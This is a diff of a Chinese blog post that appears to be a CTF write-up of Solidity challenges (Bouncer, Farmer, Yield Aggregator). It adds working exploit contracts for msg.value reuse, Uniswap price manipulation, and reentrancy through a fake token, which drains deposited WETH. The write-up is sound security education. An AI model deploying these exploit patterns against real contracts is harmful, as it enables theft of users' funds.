@@ -346,21 +346,21 @@ function attack() public">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-09-10
+                    2023-09-11
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    591
+                    1.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    5 分
                 </div>
                 
 
@@ -463,43 +463,147 @@ contract Dummy {
 </code></pre>
 <h2 id="Bouncer"><a href="#Bouncer" class="headerlink" title="Bouncer"></a>Bouncer</h2><p>众所周知当我们使用msg.value时一定要避免被循环调用。</p>
 <p>很遗憾，此合约并没有做到。它提供了convertMany()去循环调用convert()。导致我们付一次款能被多次计算。</p>
-<pre><code>pragma solidity ^0.8.0;
+<pre><code>function attack() public payable {
+    uint256 bouncerBalance = address(bouncer).balance;
 
-import "./Setup.sol";
+    uint256 _amount = bouncerBalance + 2 * 1 ether;
+    bouncer.enter{value: 1 ether}(ETH, _amount);
+    bouncer.enter{value: 1 ether}(ETH, _amount);
 
-contract Sender {
-    constructor(address to) payable {
-        selfdestruct(payable(to));
-    }
+    withdrawalAmount = _amount;
 }
 
+function attack2() public payable {
+    uint256[] memory arr = new uint256[](2);
+    for (uint256 i = 0; i &lt; arr.length; i++) {
+      arr[i] = i;
+    }
+    bouncer.convertMany{value: withdrawalAmount}(address(this), arr);
+
+    bouncer.redeem(ERC20Like(ETH), withdrawalAmount *arr.length);
+}
+</code></pre>
+<h2 id="Farmer"><a href="#Farmer" class="headerlink" title="Farmer"></a>Farmer</h2><p>可以看到题目要求我们让farmer在交易后的实际资产少于期待资产，也就是亏钱。</p>
+<p>题中的2个合约想要同过Uniswap的Comp-&gt;WETH-&gt;DAI流程出售代币来套利。</p>
+<p>现然我们可以在调用recycle()套利前，通过拔高WETH的价格或DAI的价格，来使farmer亏损。</p>
+<pre><code>function attack() external payable {
+
+  WETH.deposit{value: msg.value}();
+  WETH.approve(address(ROUTER), type(uint256).max);
+
+  address[] memory path = new address[](2);
+  path[0] = address(WETH);
+  path[1] = address(DAI);
+
+  uint256 amount = WETH.balanceOf(address(this));
+
+  ROUTER.swapExactTokensForTokens(
+      amount,
+      0,
+      path,
+      address(this),
+      block.timestamp
+  );
+
+  farmer.claim();
+  farmer.recycle();
+}
+</code></pre>
+<h2 id="Yield-Aggregator"><a href="#Yield-Aggregator" class="headerlink" title="Yield Aggregator"></a>Yield Aggregator</h2><p>这题要求我们窃取受害者存入bank中的50WETH。</p>
+<p>我们很容易发现deposit()有很大的漏洞，因为它并未对传入的protocol和tokens审查。我们可以在protocol和tokens中做手脚，所以也有2种解法。</p>
+<p>第一种</p>
+<p>由于未对protocol审查，加上poolTokens未区分每个protocol。导致我们可以在A银行存款，但在B银行取款。</p>
+<pre><code>pragma solidity 0.8.0;
+
+import "./setup.sol";
+
+contract Attack {
+    WETH9 constant weth = WETH9(0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8); 
+    YieldAggregator public aggregator;
+    MiniBank public bankA;
+    MiniBank public bankB;
+
+    constructor(address _bankA, address _aggregator) payable {
+       bankA = MiniBank(_bankA);
+       bankB = new MiniBank();
+       aggregator = YieldAggregator(_aggregator);
+
+        weth.deposit{value: msg.value}();
+        weth.approve(_aggregator, type(uint256).max);
+    }
+
+    function attack () public {
+        address[] memory _tokens = new address[](1);
+        _tokens[0] = address(weth);
+
+        uint256[] memory _amounts = new uint256[](1);
+        _amounts[0] = 50 gwei;
+
+        aggregator.deposit(Protocol(address(bankB)), _tokens, _amounts);
+
+        aggregator.withdraw(Protocol(bankA), _tokens, _amounts);
+    }
+}
+</code></pre>
+<p>第二种</p>
+<p>由于未审查tokens，因此我们可以传入被我们控制的tokens，然后恶意的构造transferFrom，实施重入。</p>
+<pre><code>pragma solidity ^0.8.0;
+
+import "./setup.sol";
+
 contract Exploit {
-    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
-    Setup setup;
-    Bouncer bouncer;
 
-    constructor(Setup _setup) payable {
-        setup = _setup;
+    Setup public setup;
+    YieldAggregator public aggregator;
+    MiniBank public bank;
+    WETH9 constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
 
-        bouncer = setup.bouncer();
 
-        bouncer.enter{value: 1 ether}(ETH, 10 ether);
+    constructor(address _setup, address _aggregator, address _bank) payable {
+        setup = Setup(_setup);
+        aggregator = YieldAggregator(_aggregator);
+        bank = MiniBank(_bank);
+        weth.deposit{value: msg.value}();
+        weth.approve(address(aggregator), type(uint256).max);
+        weth.approve(address(bank), type(uint256).max);
     }
 
-    function go() payable public {
-        new Sender{value: 7 ether}(address(bouncer));
+    function go() public {
+        address[] memory _tokens = new address[](1);
+        _tokens[0] = address(this);
 
-        uint256 num = 7;
-        uint256[] memory req = new uint256[](num);
-        for (uint256 i = 0; i &lt; num; i++) {
-            req[i] = 0;
+        uint256[] memory _amounts = new uint256[](1);
+        _amounts[0] = 1;
+        aggregator.deposit(bank, _tokens, _amounts);
 
-        }
-        bouncer.convertMany{value: 10 ether}(address(this), req);
-        bouncer.redeem(ERC20Like(ETH), uint256(num * 10 ether));
+        _tokens[0] = address(weth);
+        _amounts[0] = 100 ether;
+        aggregator.withdraw(bank, _tokens, _amounts);
     }
 
-    receive() external payable {}
+    function transferFrom(
+        address src,
+        address dst,
+        uint256 qty
+    ) external returns (bool) {
+        address[] memory _tokens = new address[](1);
+        _tokens[0] = address(weth);
+
+        uint256[] memory _amounts = new uint256[](1);
+        _amounts[0] = 50 ether;
+        aggregator.deposit(bank, _tokens, _amounts);
+    }
+
+    function approve(
+        address dst,
+        uint256 qty
+    ) external returns (bool) {
+        return true;
+    }
+
+    function balanceUnderlying() public view returns (uint256) {
+        return 0;
+    }
 }
 </code></pre>
 
@@ -967,7 +1071,7 @@ contract Exploit {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">11.4k</span>
+                        class="white-color">11.9k</span>
             
             
             
